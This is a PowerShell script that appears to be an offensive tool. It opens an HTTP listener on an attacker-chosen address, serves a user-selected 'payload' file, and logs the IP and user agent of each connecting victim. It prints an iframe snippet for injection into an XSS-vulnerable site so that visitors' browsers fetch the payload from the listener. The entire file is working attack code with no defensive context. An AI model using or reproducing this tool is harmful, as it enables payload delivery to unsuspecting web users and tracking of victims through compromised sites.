try {
    Add-Type -AssemblyName system.windows.forms
    Add-Type -AssemblyName system.net
} catch {
}
function response ($text)
{
    [byte[]] $b = [System.Text.Encoding]::UTF8.GetBytes("$text")
    $res.ContentLength64 = $b.Length
    $out = $res.OutputStream
    $out.Write($b, 0, $b.Length)
    $out.Close()
}
Write-Host "[+] select a payload file first" -ForegroundColor Cyan
sleep 1
$obj = New-Object System.Windows.Forms.OpenFileDialog
$obj.ShowDialog()
$file = $obj.FileName
if ([string]::IsNullOrEmpty($file))
{
    Write-Host "[-] didnt select a payload, exiting" -ForegroundColor Yellow
    exit
} elseif (!(Test-Path $file))
{
    Write-Host "[-] file not found, exiting" -ForegroundColor Yellow
    exit
}
$ip = Read-Host "Listener Ip address"
$port = Read-Host "Listning port(default 80)"
$lisn = New-Object System.Net.HttpListener
$lisn.Prefixes.Add("http://$ip`:$port/")
try {
    $lisn.Start()
} catch {
    Write-Host "[-] Error: $($_[0])`n`n" -ForegroundColor Yellow
    exit
}
$filee = $file.split('.')
[int]$count = $filee.count
[int]$count = $count-1
while ($true)
{
    [console]::Title = "Listening on $($lisn.Prefixes)"
    Write-Host "inject " -ForegroundColor Magenta -NoNewline;
    Write-Host "<iframe src=$($lisn.Prefixes)p.$($filee[$count])></iframe>" -ForegroundColor White -NoNewline;
    Write-Host " to a XSS vulnerable site`n`n`n" -ForegroundColor Magenta
    Write-Host "Listening on $($lisn.Prefixes)..." -ForegroundColor White -BackgroundColor DarkGreen -NoNewline
    $cont = $lisn.GetContext()
    Write-Host "[Connection captured]" -ForegroundColor Green
    $req = $cont.Request
    $res = $cont.Response
    "
      ________________________
      \
      / UserAgent: $($req.UserAgent)
     / IP: $($req.RemoteEndPoint.Address.IPAddressToString)
    ( EndPoint: $($req.RemoteEndPoint)
     \ LookingFor: $($req.RawUrl)
      \ Method: $($req.HttpMethod)
      /______________________
    "
    if ($req.HttpMethod -eq 'GET')
    {
        if ($req.RawUrl -eq "/end")
        {
            $lisn.Stop()
            exit
        } elseif ($req.RawUrl -eq "/p.$($filee[$count])")
        {
            $res.ContentType = "Application/$($filee[$count])"
            $toout = $null
            foreach ($tmp in (cat $file))
            {
                $toout += "$tmp`n"
            }
            response -text $toout
        }
    }
}


